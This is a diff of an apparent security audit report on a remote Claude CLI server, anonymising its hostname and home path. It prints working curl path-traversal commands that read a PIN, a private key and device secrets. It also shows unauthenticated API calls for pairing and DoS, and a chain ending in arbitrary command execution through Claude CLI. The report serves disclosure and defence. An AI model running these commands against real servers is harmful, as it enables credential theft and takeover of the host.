@@ -8,7 +8,7 @@
 
 ## Executive Summary
 
-A **full unauthenticated RCE chain** exists. An attacker with network access to the server (through the Cloudflare tunnel at `ai-server.pond.audio`) can read all crypto secrets via path traversal, pair their own device, authenticate, and execute arbitrary commands through Claude CLI. No credentials are needed upfront.
+A **full unauthenticated RCE chain** exists. An attacker with network access to the server (through the Cloudflare tunnel at `your-server.example.com`) can read all crypto secrets via path traversal, pair their own device, authenticate, and execute arbitrary commands through Claude CLI. No credentials are needed upfront.
 
 ---
 
@@ -35,15 +35,15 @@ if (!existsSync(filePath) || !filePath.includes(".")) {
 
 ```bash
 # Read the PIN (server must have dist/client/ built)
-curl --path-as-is 'https://ai-server.pond.audio/../../.env.local'
+curl --path-as-is 'https://your-server.example.com/../../.env.local'
 # → CLAUDE_REMOTE_PIN=<pin>
 
 # Read the server's ECDH private key
-curl --path-as-is 'https://ai-server.pond.audio/../../../../.config/claude-remote/server.json'
+curl --path-as-is 'https://your-server.example.com/../../../../.config/claude-remote/server.json'
 # → {"privateKey":"...","publicKey":"...","pairingToken":"..."}
 
 # Read all paired device shared secrets
-curl --path-as-is 'https://ai-server.pond.audio/../../../../.config/claude-remote/devices.json'
+curl --path-as-is 'https://your-server.example.com/../../../../.config/claude-remote/devices.json'
 # → [{"id":"...","sharedSecret":"..."}]
 ```
 
@@ -90,16 +90,16 @@ Every HTTP endpoint is world-readable/writable. There is zero authentication on 
 
 ```bash
 # Get a pairing token
-curl -X POST 'https://ai-server.pond.audio/api/new-pair-token'
+curl -X POST 'https://your-server.example.com/api/new-pair-token'
 
 # Read all conversations
-curl 'https://ai-server.pond.audio/api/conversation'
+curl 'https://your-server.example.com/api/conversation'
 
 # Unpair all legitimate devices (DoS)
-curl -X POST 'https://ai-server.pond.audio/api/unpair'
+curl -X POST 'https://your-server.example.com/api/unpair'
 
 # Cancel all running tasks (DoS)
-curl -X POST 'https://ai-server.pond.audio/api/projects/remote-claude-real/cancel'
+curl -X POST 'https://your-server.example.com/api/projects/remote-claude-real/cancel'
 ```
 
 ---
@@ -111,20 +111,20 @@ Combining the above two vulnerabilities with the fact that Claude is spawned wit
 ### Step 1: Steal secrets (0 auth)
 
 ```bash
-PIN=$(curl -s --path-as-is 'https://ai-server.pond.audio/../../.env.local' | grep CLAUDE_REMOTE_PIN | cut -d= -f2)
+PIN=$(curl -s --path-as-is 'https://your-server.example.com/../../.env.local' | grep CLAUDE_REMOTE_PIN | cut -d= -f2)
 ```
 
 ### Step 2: Pair attacker device (0 auth)
 
 ```bash
 # Generate fresh token
-TOKEN=$(curl -s -X POST 'https://ai-server.pond.audio/api/new-pair-token' | jq -r .token)
+TOKEN=$(curl -s -X POST 'https://your-server.example.com/api/new-pair-token' | jq -r .token)
 
 # Get server public key
-SERVER_PUB=$(curl -s "https://ai-server.pond.audio/pair/$TOKEN" | jq -r .serverPublicKey)
+SERVER_PUB=$(curl -s "https://your-server.example.com/pair/$TOKEN" | jq -r .serverPublicKey)
 
 # POST attacker's ECDH public key, complete pairing
-curl -s -X POST "https://ai-server.pond.audio/pair/$TOKEN" \
+curl -s -X POST "https://your-server.example.com/pair/$TOKEN" \
   -H 'Content-Type: application/json' \
   -d "{\"clientPublicKey\":\"$ATTACKER_PUB_KEY\"}"
 # → returns deviceId, serverPublicKey
@@ -180,12 +180,12 @@ An authenticated attacker can:
 ### Proof of Concept (requires auth)
 
 ```javascript
-// Make Claude run in /home/jamie/.ssh/ (if it has a .git or package.json)
+// Make Claude run in /home/user/.ssh/ (if it has a .git or package.json)
 ws.send(
   encrypt({
     type: "message",
     text: "list files",
-    projectId: "../../.config", // resolves to /home/jamie/.config
+    projectId: "../../.config", // resolves to /home/user/.config
   }),
 );
 ```
@@ -203,7 +203,7 @@ res.setHeader("Access-Control-Allow-Origin", "*");
 
 Any website the user visits can make cross-origin requests to the API. Combined with the unauthenticated endpoints, a malicious webpage could:
 
-- Read conversations via `fetch('https://ai-server.pond.audio/api/conversation')`
+- Read conversations via `fetch('https://your-server.example.com/api/conversation')`
 - Unpair devices
 - Generate pairing tokens
 - Cancel running tasks
